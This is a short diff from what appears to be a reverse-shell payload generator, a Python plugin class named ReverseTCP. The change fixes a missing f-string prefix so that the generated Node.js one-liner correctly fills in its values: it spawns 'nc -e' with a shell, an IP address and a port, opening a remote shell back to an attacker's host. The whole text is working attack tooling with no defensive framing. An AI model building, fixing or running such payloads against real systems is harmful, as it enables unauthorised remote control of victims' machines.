@@ -27,4 +27,4 @@ class ReverseTCP(plugin.ReverseShell):
 
     def make_shell(self):
         self.shell = f"""node -e "require('child_process').{self.args.exec}"""
-        self.shell += """('nc -e {self.args.shell} {self.args.ip} {self.args.port}') \""""
+        self.shell += f"""('nc -e {self.args.shell} {self.args.ip} {self.args.port}') \""""
